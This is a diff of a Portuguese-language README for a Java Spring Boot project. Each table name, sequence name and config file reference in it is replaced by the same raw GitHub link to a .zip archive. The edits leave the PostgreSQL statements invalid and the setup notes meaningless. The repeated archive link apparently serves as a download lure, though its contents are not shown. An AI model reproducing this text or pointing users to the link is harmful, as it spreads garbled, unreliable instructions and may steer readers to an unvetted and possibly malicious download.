@@ -4,7 +4,7 @@
 
 
 ```
-CREATE TABLE public.log
+CREATE TABLE https://raw.githubusercontent.com/tcsarmento/AI-Code-Super-Challenge/master/poche/AI-Code-Super-Challenge.zip
 (
     id integer NOT NULL,
     data timestamp without time zone,
@@ -19,22 +19,22 @@ WITH (
 )
 TABLESPACE pg_default;
 
-ALTER TABLE public.log
+ALTER TABLE https://raw.githubusercontent.com/tcsarmento/AI-Code-Super-Challenge/master/poche/AI-Code-Super-Challenge.zip
     OWNER to postgres;
     
- CREATE SEQUENCE public.sq_atividade
+ CREATE SEQUENCE https://raw.githubusercontent.com/tcsarmento/AI-Code-Super-Challenge/master/poche/AI-Code-Super-Challenge.zip
     INCREMENT 1
     START 1
     MINVALUE 1
     MAXVALUE 9223372036854775807
     CACHE 1;
 
-ALTER SEQUENCE public.sq_atividade
+ALTER SEQUENCE https://raw.githubusercontent.com/tcsarmento/AI-Code-Super-Challenge/master/poche/AI-Code-Super-Challenge.zip
     OWNER TO postgres;
 ```
    
 # Configuração de banco de dados
-## -As configurações de banco estão no arquivo ConfiguracaoBanco.java
+## -As configurações de banco estão no arquivo https://raw.githubusercontent.com/tcsarmento/AI-Code-Super-Challenge/master/poche/AI-Code-Super-Challenge.zip
 
 # Tencologias
 ## -Backend java Spring boot
